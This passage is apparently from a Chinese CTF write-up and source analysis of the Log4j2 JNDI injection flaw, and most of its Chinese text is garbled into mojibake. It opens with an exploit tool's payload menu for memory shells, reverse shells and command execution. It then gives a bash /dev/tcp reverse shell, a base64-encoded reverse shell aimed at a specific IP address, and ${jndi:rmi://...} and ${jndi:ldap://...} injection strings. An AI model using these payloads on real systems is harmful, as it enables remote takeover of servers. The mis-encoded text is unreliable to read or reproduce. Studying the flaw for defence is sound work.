ldap://127.0.0.1:1389/Basic/JBossMemshell ldap://127.0.0.1:1389/Basic/WebsphereMemshell ldap://127.0.0.1:1389/Basic/SpringMemshell [+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g. ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain] ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain] ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd] ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port] ---windows NOT supported ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1 ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1 ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2 ---ALSO support other memshells [+] TomcatBypass Queries ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain] ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd] ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd] ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port] ---windows NOT supported ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho ldap://127.0.0.1:1389/TomcatBypass/SpringEcho ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1 ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2 ---need extra header [Shell: true] ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell [+] GroovyBypass Queries ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd] ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd] [+] WebsphereBypass Queries ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory] ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain] ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd] ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd] ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port] ---windows NOT supported ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path] ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp ç›®å‰æ”¯æŒçš„æ‰€æœ‰ PayloadType ä¸º Dnslog: ç”¨äºäº§ç”Ÿä¸€ä¸ªDNSè¯·æ±‚ï¼Œä¸ DNSLogå¹³å°é…åˆä½¿ç”¨ï¼Œå¯¹Linux/Windowsè¿›è¡Œäº†ç®€å•çš„é€‚é… Command: ç”¨äºæ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœå‘½ä»¤æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ”¯æŒå¯¹å‘½ä»¤è¿›è¡Œ Base64ç¼–ç åä¼ è¾“ ReverseShell: ç”¨äº Linux ç³»ç»Ÿçš„åå¼¹shellï¼Œæ–¹ä¾¿ä½¿ç”¨ TomcatEcho: ç”¨äºåœ¨ä¸­é—´ä»¶ä¸º Tomcat æ—¶å‘½ä»¤æ‰§è¡Œç»“æœçš„å›æ˜¾ï¼Œé€šè¿‡æ·»åŠ è‡ªå®šä¹‰header cmd: whoami çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ SpringEcho: ç”¨äºåœ¨æ¡†æ¶ä¸º SpringMVC/SpringBoot æ—¶å‘½ä»¤æ‰§è¡Œç»“æœçš„å›æ˜¾ï¼Œé€šè¿‡æ·»åŠ è‡ªå®šä¹‰header cmd: whoami çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ WeblogicEcho: ç”¨äºåœ¨ä¸­é—´ä»¶ä¸º Weblogic æ—¶å‘½ä»¤æ‰§è¡Œç»“æœçš„å›æ˜¾ï¼Œé€šè¿‡æ·»åŠ è‡ªå®šä¹‰header cmd: whoami çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ TomcatMemshell1: ç”¨äºæ¤å…¥Tomcatå†…å­˜shellï¼Œ æ”¯æŒBehinder shell ä¸ Basic cmd shell TomcatMemshell2: ç”¨äºæ¤å…¥Tomcatå†…å­˜shellï¼Œ æ”¯æŒBehinder shell ä¸ Basic cmd shell, ä½¿ç”¨æ—¶éœ€è¦æ·»åŠ é¢å¤–çš„HTTP Header Shell: true, æ¨èä½¿ç”¨æ­¤æ–¹å¼ SpringMemshell: ç”¨äºæ¤å…¥Springå†…å­˜shellï¼Œ æ”¯æŒBehinder shell ä¸ Basic cmd shell WeblogicMemshell1: ç”¨äºæ¤å…¥Weblogicå†…å­˜shellï¼Œ æ”¯æŒBehinder shell ä¸ Basic cmd shell WeblogicMemshell2: ç”¨äºæ¤å…¥Weblogicå†…å­˜shellï¼Œ æ”¯æŒBehinder shell ä¸ Basic cmd shellï¼Œæ¨èä½¿ç”¨æ­¤æ–¹å¼ JettyMemshell: ç”¨äºæ¤å…¥Jettyå†…å­˜shellï¼Œ æ”¯æŒBehinder shell ä¸ Basic cmd shell JBossMemshell: ç”¨äºæ¤å…¥JBosså†…å­˜shellï¼Œ æ”¯æŒBehinder shell ä¸ Basic cmd shell WebsphereMemshell: ç”¨äºæ¤å…¥Websphereå†…å­˜shellï¼Œ æ”¯æŒBehinder shell ä¸ Basic cmd shell ç›®å‰æ”¯æŒçš„æ‰€æœ‰ GadgetType ä¸º 1.URLDNS 2.CommonsBeanutils1 3.CommonsBeanutils2 4.CommonsCollectionsK1 5.CommonsCollectionsK2 6.C3P0 7.Jdk7u21 8.Jre8u20 9.CVE_2020_2551 10CVE_2020_2883 WebsphereBypass ä¸­çš„ 3 ä¸ªåŠ¨ä½œï¼š 1.listï¼šåŸºäºXXEæŸ¥çœ‹ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„ç›®å½•æˆ–æ–‡ä»¶å†…å®¹ 2.uploadï¼šåŸºäºXXEçš„jaråè®®å°†æ¶æ„jaråŒ…ä¸Šä¼ è‡³ç›®æ ‡æœåŠ¡å™¨çš„ä¸´æ—¶ç›®å½• 3.rceï¼šåŠ è½½å·²ä¸Šä¼ è‡³ç›®æ ‡æœåŠ¡å™¨ä¸´æ—¶ç›®å½•çš„jaråŒ…ï¼Œä»è€Œè¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ•ˆæœï¼ˆè¿™ä¸€æ­¥æœ¬åœ°æœªå¤ç°æˆåŠŸï¼ŒæŠ›4.java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.å¼‚å¸¸ï¼Œæœ‰å¤ç°æˆåŠŸçš„å°ä¼™ä¼´éº»çƒ¦æŒ‡å¯¼ä¸‹ï¼‰ 2. VPSéƒ¨ç½²ldapæœåŠ¡ å°†JNDIæ³¨å…¥å·¥å…·ä¼ åˆ°vpsæœåŠ¡å™¨ä¸Šå¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ åå¼¹shellæŒ‡ä»¤ï¼š bash -i &gt;&amp; /dev/tcp/your-ip/è‡ªå·±è®¾ç½®çš„ç›‘å¬ç«¯å£å· 0&gt;&amp;1 JNDIå¯åŠ¨æ–¹æ³•ï¼š java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzcvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}\" -A xxx.xxx.xxx.xxx è¿™ä¸ªåœ°æ–¹æ˜¯åå¼¹shellæŒ‡ä»¤ç»è¿‡base64ç¼–ç åæ‰€å¾—ã€‚è¿™ä¸²ä»£ç é‡Œåªéœ€æ”¹æ­¤å¤„å’Œæœ€åé¢æœåŠ¡å™¨çš„IP -Cæ˜¯æ‰§è¡Œçš„bashå‘½ä»¤ï¼Œ-cå‚æ•°åé¢æ˜¯æ‰§è¡Œçš„å…·ä½“å‘½ä»¤ï¼Œç”¨åŒå¼•å·å¼•èµ·æ¥ -A æŒ‡æœåŠ¡å™¨çš„IP å°†åå¼¹shellæŒ‡ä»¤base64ç¼–ç åï¼Œå°†ä¸€æ•´ä¸²å¯åŠ¨JNDIä»£ç åœ¨vpsä¸­è¿è¡Œ è¿™é‡Œä½¿ç”¨ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}\" -A 124.220.233.26 ä½¿ç”¨burpsuitæŠ“åŒ…ï¼Œæ›¿æ¢payload rmi://124.220.233.26:1099/29h4wg ${jndi:rmi://124.220.233.26:1099/29h4wg} //è®°å¾—urlç¼–ç  æˆåŠŸåå¼¹shell æ‰¾åˆ°flag 0x06 Log4j2æºç æµ…æ Log4j2æ˜¯Apacheçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œé€šè¿‡ä½¿ç”¨Log4j2ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°æ˜¯æ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„ä»¶ï¼Œç”šè‡³æ˜¯å¥—æ¥å£æœåŠ¡å™¨ã€NTçš„äº‹ä»¶è®°å½•å™¨ã€UNIX Syslogå®ˆæŠ¤è¿›ç¨‹ç­‰ï¼›æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶æ¯ä¸€æ¡æ—¥å¿—çš„è¾“å‡ºæ ¼å¼ï¼›é€šè¿‡å®šä¹‰æ¯ä¸€æ¡æ—¥å¿—ä¿¡æ¯çš„çº§åˆ«ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ›´åŠ ç»†è‡´åœ°æ§åˆ¶æ—¥å¿—çš„ç”Ÿæˆè¿‡ç¨‹ã€‚æœ€ä»¤äººæ„Ÿå…´è¶£çš„å°±æ˜¯ï¼Œè¿™äº›å¯ä»¥é€šè¿‡ä¸€ä¸ªé…ç½®æ–‡ä»¶æ¥çµæ´»åœ°è¿›è¡Œé…ç½®ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹åº”ç”¨çš„ä»£ç ã€‚ ä»ä¸Šé¢çš„è§£é‡Šä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Log4j2çš„åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œè¿™é‡Œä¼šç®€å•åˆ†æå…¶ä¸æ¼æ´ç›¸å…³è”éƒ¨åˆ†çš„æºç å®ç°ï¼Œæ¥æ›´ç†Ÿæ‚‰Log4j2çš„æ¼æ´äº§ç”ŸåŸå› ã€‚ æˆ‘ä»¬ä½¿ç”¨mavenæ¥å¼•å…¥ç›¸å…³ç»„ä»¶çš„2.14.0ç‰ˆæœ¬ï¼Œåœ¨å·¥ç¨‹çš„pom.xmlä¸‹æ·»åŠ å¦‚ä¸‹é…ç½®ï¼Œä»–ä¼šå¯¼å…¥ä¸¤ä¸ªjaråŒ…(è¿™é‡Œæ˜¯è·Ÿç€æ–‡ç« èµ°çš„ï¼Œæš‚æ—¶ä¸å®æ“äº†ï¼Œç”¨è„‘å­å¤ç°ä¸€æ³¢) &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; åœ¨å·¥ç¨‹ç›®å½•resourcesä¸‹åˆ›å»ºlog4j2.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;configuration status=\"error\"&gt; &lt;appenders&gt; &lt;!-- é…ç½®Appendersè¾“å‡ºæºä¸ºConsoleå’Œè¾“å‡ºè¯­å¥SYSTEM_OUT--&gt; &lt;Console name=\"Console\" target=\"SYSTEM_OUT\" &gt; &lt;!-- é…ç½®Consoleçš„æ¨¡å¼å¸ƒå±€--&gt; &lt;PatternLayout pattern=\"%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n\"/&gt; &lt;/Console&gt; &lt;/appenders&gt; &lt;loggers&gt; &lt;root level=\"error\"&gt; &lt;appender-ref ref=\"Console\"/&gt; &lt;/root&gt; &lt;/loggers&gt; &lt;/configuration&gt; log4j2ä¸­åŒ…å«ä¸¤ä¸ªå…³é”®ç»„ä»¶LogManagerå’ŒLoggerContextã€‚LogManageræ˜¯Log4J2å¯åŠ¨çš„å…¥å£ï¼Œå¯ä»¥åˆå§‹åŒ–å¯¹åº”çš„LoggerContextã€‚LoggerContextä¼šå¯¹é…ç½®æ–‡ä»¶è¿›è¡Œè§£æç­‰å…¶å®ƒæ“ä½œã€‚ åœ¨ä¸ä½¿ç”¨slf4jçš„æƒ…å†µä¸‹å¸¸è§çš„Log4Jç”¨æ³•æ˜¯ä»LogManagerä¸­è·å–Loggeræ¥å£çš„ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶è°ƒç”¨è¯¥æ¥å£ä¸Šçš„æ–¹æ³•ã€‚è¿è¡Œä¸‹åˆ—ä»£ç æŸ¥çœ‹æ‰“å°ç»“æœ import org.apache.logging.log4j.LogManager;//å¯¼å…¥æ‰€éœ€çš„åŒ…è¿™é‡Œå¯¼å…¥äº† Apache Log4j 2.x çš„ LogManager å’Œ Logger ç±»ã€‚ import org.apache.logging.log4j.Logger; //å£°æ˜ Logger å¯¹è±¡ï¼Œåˆ›å»ºäº†ä¸€ä¸ªé™æ€çš„ Logger å¯¹è±¡ loggerï¼Œä½¿ç”¨ LogManager.getLogger() æ–¹æ³•åˆå§‹åŒ–ã€‚ //Logger å¯¹è±¡ç”¨äºè®°å½•æ—¥å¿—ã€‚ public class log4j2Rce2 { private static final Logger logger = LogManager.getLogger(log4j2Rce2.class); //ä¸Šè¿°é™æ€å¯¹è±¡çš„åˆå§‹åŒ–ï¼šåˆ›å»ºä¸€ä¸ª Logger å¯¹è±¡ï¼Œå¹¶å°†å…¶ä¸å½“å‰çš„ log4j2Rce2 ç±»å…³è”èµ·æ¥ï¼Œä»¥ä¾¿åœ¨è¯¥ç±»ä¸­è®°å½•æ—¥å¿—ã€‚ public static void main(String[] args) { String a=\"${java:os}\"; logger.error(a); } } //åœ¨ main æ–¹æ³•ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ a å¹¶èµ‹å€¼ä¸º \"${java:os}\"ã€‚ç„¶åï¼Œä½¿ç”¨ logger çš„ error() æ–¹æ³•å°†å­—ç¬¦ä¸² a è®°å½•ä¸ºé”™è¯¯æ—¥å¿—ã€‚ å±æ€§å ä½ç¬¦ä¹‹Interpolatoræ’å€¼å™¨ log4j2ä¸­ç¯å¢ƒå˜é‡é”®å€¼å¯¹è¢«å°è£…ä¸ºäº†StrLookupå¯¹è±¡ã€‚è¿™äº›å˜é‡çš„å€¼å¯ä»¥é€šè¿‡å±æ€§å ä½ç¬¦æ¥å¼•ç”¨ï¼Œæ ¼å¼ä¸º:${prefix:key}ã€‚åœ¨Interpolatoræ’å€¼å™¨å†…éƒ¨ä»¥Mapçš„æ–¹å¼åˆ™å°è£…äº†å¤šä¸ªStrLookupå¯¹è±¡ï¼Œå¦‚ä¸‹å›¾æ˜¾ç¤ºï¼š è¯¦ç»†ä¿¡æ¯å¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ã€‚è¿™äº›å®ç°ç±»å­˜åœ¨äºorg.apache.logging.log4j.core.lookupåŒ…ä¸‹ã€‚ å½“å‚æ•°å ä½ç¬¦${prefix:key}å¸¦æœ‰prefixå‰ç¼€æ—¶ï¼ŒInterpolatorä¼šä»æŒ‡å®šprefixå¯¹åº”çš„StrLookupå®ä¾‹ä¸­è¿›è¡ŒkeyæŸ¥è¯¢ã€‚å½“å‚æ•°å ä½ç¬¦${key}æ²¡æœ‰prefixæ—¶ï¼ŒInterpolatoråˆ™ä¼šä»é»˜è®¤æŸ¥æ‰¾å™¨ä¸­è¿›è¡ŒæŸ¥è¯¢ã€‚å¦‚ä½¿ç”¨${jndi:key}æ—¶ï¼Œå°†ä¼šè°ƒç”¨JndiLookupçš„lookupæ–¹æ³• ä½¿ç”¨jndi(javax.naming)è·å–valueã€‚å¦‚ä¸‹å›¾æ¼”ç¤ºã€‚ æ¨¡å¼å¸ƒå±€ log4j2æ”¯æŒé€šè¿‡é…ç½®Layoutæ‰“å°æ ¼å¼åŒ–çš„æŒ‡å®šå½¢å¼æ—¥å¿—ï¼Œå¯ä»¥åœ¨Appendersçš„åé¢é™„åŠ Layoutsæ¥å®Œæˆè¿™ä¸ªåŠŸèƒ½ã€‚å¸¸ç”¨ä¹‹ä¸€æœ‰PatternLayoutï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶ä¸­PatternLayoutå­—æ®µæ‰€æŒ‡å®šçš„å±æ€§patternçš„å€¼%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%nã€‚ %msgè¡¨ç¤ºæ‰€è¾“å‡ºçš„æ¶ˆæ¯ï¼Œå…¶å®ƒæ ¼å¼åŒ–å­—ç¬¦æ‰€è¡¨ç¤ºçš„æ„ä¹‰å¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ã€‚ PatternLayoutæ¨¡å¼å¸ƒå±€ä¼šé€šè¿‡PatternProcessoræ¨¡å¼è§£æå™¨ï¼Œå¯¹æ¨¡å¼å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå¾—åˆ°ä¸€ä¸ªList&lt;PatternConverter&gt;è½¬æ¢å™¨åˆ—è¡¨å’ŒList&lt;FormattingInfo&gt;æ ¼å¼ä¿¡æ¯åˆ—è¡¨ã€‚åœ¨é…ç½®æ–‡ä»¶PatternLayoutæ ‡ç­¾çš„patternå±æ€§ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç±»ä¼¼%dçš„å†™æ³•ï¼Œdä»£è¡¨ä¸€ä¸ªè½¬æ¢å™¨åç§°ï¼Œlog4j2ä¼šé€šè¿‡PluginManageræ”¶é›†æ‰€æœ‰ç±»åˆ«ä¸ºConverterçš„æ’ä»¶,åŒæ—¶åˆ†ææ’ä»¶ç±»ä¸Šçš„@ConverterKeysæ³¨è§£,è·å–è½¬æ¢å™¨åç§°,å¹¶å»ºç«‹åç§°åˆ°æ’ä»¶å®ä¾‹çš„æ˜ å°„å…³ç³»ï¼Œå½“PatternParserè¯†åˆ«åˆ°è½¬æ¢å™¨åç§°çš„æ—¶å€™,ä¼šæŸ¥æ‰¾æ˜ å°„ã€‚ç›¸å…³è½¬æ¢å™¨åç§°æ³¨è§£å’ŒåŠ è½½çš„æ’ä»¶å®ä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æœ¬æ¬¡æ¼æ´å…³é”®åœ¨äºè½¬æ¢å™¨åç§°msgå¯¹åº”çš„æ’ä»¶å®ä¾‹ä¸ºMessagePatternConverterå¯¹äºæ—¥å¿—ä¸­çš„æ¶ˆæ¯å†…å®¹å¤„ç†å­˜åœ¨é—®é¢˜ï¼Œè¿™éƒ¨åˆ†æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚MessagePatternConverterä¼šå°†æ—¥å¿—ä¸­çš„æ¶ˆæ¯å†…å®¹ä¸º${prefix:key}æ ¼å¼çš„å­—ç¬¦ä¸²è¿›è¡Œè§£æè½¬æ¢ï¼Œè¯»å–ç¯å¢ƒå˜é‡ã€‚æ­¤æ—¶ä¸ºjndiçš„æ–¹å¼çš„è¯ï¼Œå°±å­˜åœ¨æ¼æ´ã€‚ æ—¥å¿—çº§åˆ« log4j2æ”¯æŒç§æ—¥å¿—çº§åˆ«ï¼Œé€šè¿‡æ—¥å¿—çº§åˆ«æˆ‘ä»¬å¯ä»¥å°†æ—¥å¿—ä¿¡æ¯è¿›è¡Œåˆ†ç±»ï¼Œåœ¨åˆé€‚çš„åœ°æ–¹è¾“å‡ºå¯¹åº”çš„æ—¥å¿—ã€‚å“ªäº›ä¿¡æ¯éœ€è¦è¾“å‡ºï¼Œå“ªäº›ä¿¡æ¯ä¸éœ€è¦è¾“å‡ºï¼Œåªéœ€åœ¨ä¸€ä¸ªæ—¥å¿—è¾“å‡ºæ§åˆ¶æ–‡ä»¶ä¸­ç¨åŠ ä¿®æ”¹å³å¯ã€‚çº§åˆ«ç”±é«˜åˆ°ä½å…±åˆ†ä¸º6ä¸ªï¼šfatal(è‡´å‘½çš„), error, warn, info, debug, trace(å †æ ˆ)ã€‚ log4j2è¿˜å®šä¹‰äº†ä¸€ä¸ªå†…ç½®çš„æ ‡å‡†çº§åˆ«intLevelï¼Œç”±æ•°å€¼è¡¨ç¤ºï¼Œçº§åˆ«è¶Šé«˜æ•°å€¼è¶Šå°ã€‚ å½“æ—¥å¿—çº§åˆ«ï¼ˆè°ƒç”¨ï¼‰å¤§äºç­‰äºç³»ç»Ÿè®¾ç½®çš„intLevelçš„æ—¶å€™ï¼Œlog4j2æ‰ä¼šå¯ç”¨æ—¥å¿—æ‰“å°ã€‚åœ¨å­˜åœ¨é…ç½®æ–‡ä»¶çš„æ—¶å€™ ï¼Œä¼šè¯»å–é…ç½®æ–‡ä»¶ä¸­&lt;root level=\"error\"&gt;å€¼è®¾ç½®intLevelã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡Configurator.setLevel(\"å½“å‰ç±»å\", Level.INFO);æ¥æ‰‹åŠ¨è®¾ç½®ã€‚å¦‚æœæ²¡æœ‰é…ç½®æ–‡ä»¶ä¹Ÿæ²¡æœ‰æŒ‡å®šåˆ™ä¼šé»˜è®¤ä½¿ç”¨Errorçº§åˆ«ï¼Œä¹Ÿå°±æ˜¯200ï¼Œå¦‚ä¸‹å›¾ä¸­çš„å¤„ç†ï¼š 0x07 æ¼æ´åŸç† é¦–å…ˆå…ˆæ¥çœ‹ä¸€ä¸‹ç½‘ç»œä¸Šæµä¼ æœ€å¤šçš„payload ${jndi:ldap://2lnhn2.ceye.io} è€Œè§¦å‘æ¼æ´çš„æ–¹æ³•ï¼Œå¤§å®¶éƒ½æ˜¯ä»¥Logger.error()æ–¹æ³•æ¥è¿›è¡Œæ¼”ç¤ºï¼Œé‚£è¿™é‡Œæˆ‘ä»¬ä¹Ÿé‡‡ç”¨åŒæ ·çš„æ–¹å¼æ¥è®²è§£ï¼Œå…·ä½“æ¼æ´ç¯å¢ƒä»£ç å¦‚ä¸‹æ‰€ç¤º import org.apache.logging.log4j.Level; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.core.config.Configurator; public class Log4jTEst { public static void main(String[] args) { Logger logger = LogManager.getLogger(Log4jTEst.class); logger.error(\"${jndi:ldap://2lnhn2.ceye.io}\"); } } ç›´å‡»æ¼æ´æœ¬æºï¼Œå°†æ–­ç‚¹æ–­åœ¨org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.javaä¸­çš„directEncodeEventæ–¹æ³•ä¸Šï¼Œè¯¥æ–¹æ³•çš„ç¬¬ä¸€è¡Œä»£ç å°†è¿”å›å½“å‰ä½¿ç”¨çš„å¸ƒå±€ï¼Œå¹¶è°ƒç”¨å¯¹åº”å¸ƒå±€å¤„ç†å™¨çš„encodeæ–¹æ³•ã€‚log4j2é»˜è®¤å¸ƒå±€ä½¿ç”¨çš„æ˜¯PatternLayoutï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç»§ç»­è·Ÿè¿›åœ¨encodeä¸­ä¼šè°ƒç”¨toTextæ–¹æ³•ï¼Œæ ¹æ®æ³¨é‡Šï¼Œè¯¥æ–¹æ³•çš„ä½œç”¨ä¸ºåˆ›å»ºæŒ‡å®šæ—¥å¿—äº‹ä»¶çš„æ–‡æœ¬è¡¨ç¤ºå½¢å¼ï¼Œå¹¶å°†å…¶å†™å…¥æŒ‡å®šçš„StringBuilderä¸­ã€‚ æ¥ä¸‹æ¥ä¼šè°ƒç”¨serializer.toSerializableï¼Œå¹¶åœ¨è¿™ä¸ªæ–¹æ³•ä¸­è°ƒç”¨ä¸åŒçš„Converteræ¥å¤„ç†ä¼ å…¥çš„æ•°æ®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ è¿™é‡Œæ•´ç†äº†ä¸€ä¸‹è°ƒç”¨çš„Converter org.apache.logging.log4j.core.pattern.DatePatternConverter org.apache.logging.log4j.core.pattern.LiteralPatternConverter org.apache.logging.log4j.core.pattern.ThreadNamePatternConverter org.apache.logging.log4j.core.pattern.LevelPatternConverter org.apache.logging.log4j.core.pattern.LoggerPatternConverter org.apache.logging.log4j.core.pattern.MessagePatternConverter //æ¶ˆæ¯æ¨¡å¼è½¬æ¢å™¨ org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverter org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter è¿™ä¹ˆå¤šConverteréƒ½å°†ä¸€ä¸ªä¸ªé€šè¿‡ä¸Šå›¾ä¸­çš„forå¾ªç¯å¯¹æ—¥å¿—äº‹ä»¶è¿›è¡Œå¤„ç†ï¼Œå½“è°ƒç”¨åˆ°MessagePatternConverteræ—¶ï¼Œæˆ‘ä»¬è·Ÿå…¥MessagePatternConverter.format()æ–¹æ³•ä¸­ä¸€æ¢ç©¶ç«Ÿ åœ¨MessagePatternConverter.format()æ–¹æ³•ä¸­å¯¹æ—¥å¿—æ¶ˆæ¯è¿›è¡Œæ ¼å¼åŒ–ï¼Œå…¶ä¸­å¾ˆæ˜æ˜¾çš„çœ‹åˆ°æœ‰é’ˆå¯¹å­—ç¬¦\"{\"ï¼Œè¿™ä¸‰è¡Œä»£ç ä¸­å…³é”®ç‚¹åœ¨äºæœ€åä¸€è¡Œ è¿™é‡Œæˆ‘åœˆäº†å‡ ä¸ªé‡ç‚¹ï¼Œæœ‰åŠ©äºç†è§£Log4j2 ä¸ºä»€ä¹ˆä¼šç”¨JndiLookupï¼Œå®ƒç©¶ç«Ÿæƒ³è¦åšä»€ä¹ˆã€‚æ­¤æ—¶çš„workingBuilderæ˜¯ä¸€ä¸ªStringBuilderå¯¹è±¡ï¼Œè¯¥å¯¹è±¡å­˜æ”¾çš„å­—ç¬¦ä¸²å¦‚ä¸‹æ‰€ç¤º 09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - ${jndi:ldap://2lnhn2.ceye.io} æœ¬æ¥è¿™æ®µå­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯82ï¼Œä½†æ˜¯å´ç»™å®ƒæ”¹æˆäº†53ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºç¬¬äº”åä¸‰çš„ä½ç½®å°±æ˜¯$ç¬¦å·ï¼Œä¹Ÿå°±æ˜¯è¯´${jndi:ldap://2lnhn2.ceye.io}è¿™æ®µä¸è¦äº†ï¼Œä»ç¬¬53ä½å¼€å§‹appendã€‚è€Œappendçš„å†…å®¹æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå¯ä»¥çœ‹åˆ°ä¼ å…¥çš„å‚æ•°æ˜¯config.getStrSubstitutor().replace(event, value)çš„æ‰§è¡Œç»“æœï¼Œå…¶ä¸­çš„valueå°±æ˜¯${jndi:ldap://2lnhn2.ceye.io}è¿™æ®µå­—ç¬¦ä¸²ã€‚replaceçš„ä½œç”¨ç®€å•æ¥è¯´å°±æ˜¯æƒ³è¦è¿›è¡Œä¸€ä¸ªæ›¿æ¢ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿› ç»è¿‡ä¸€æ®µçš„åµŒå¥—è°ƒç”¨ï¼Œæ¥åˆ°Interpolator.lookupï¼Œè¿™é‡Œä¼šé€šè¿‡var.indexOf(PREFIX_SEPARATOR)åˆ¤æ–­\":\"ä¹‹å‰çš„å­—ç¬¦ï¼Œæˆ‘ä»¬è¿™é‡Œç”¨çš„æ˜¯jndiç„¶åï¼Œå°±ä¼šè·å–é’ˆå¯¹jndiçš„Strlookupå¯¹è±¡å¹¶è°ƒç”¨Strlookupçš„lookupæ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º é‚£ä¹ˆæ€»å…±æœ‰å¤šå°‘Strlookupçš„å­ç±»å¯¹è±¡å¯ä¾›é€‰æ‹©å‘¢ï¼Œå¯ä¾›è°ƒç”¨çš„Strlookupéƒ½å­˜æ”¾åœ¨å½“å‰Interpolatorç±»çš„strLookupMapå±æ€§ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤º ç„¶åç¨‹åºçš„ç»§ç»­æ‰§è¡Œå°±ä¼šæ¥åˆ°JndiLookupçš„lookupæ–¹æ³•ä¸­ï¼Œå¹¶è°ƒç”¨jndiManager.lookupæ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º è¯´åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»è¯¦ç»†äº†è§£äº†logger.error()é€ æˆRCEçš„åŸç†ï¼š å‰ææ˜¯`MessagePatternConverter`ä¼šå°†æ—¥å¿—ä¸­çš„æ¶ˆæ¯å†…å®¹ä¸º`${prefix:key}`æ 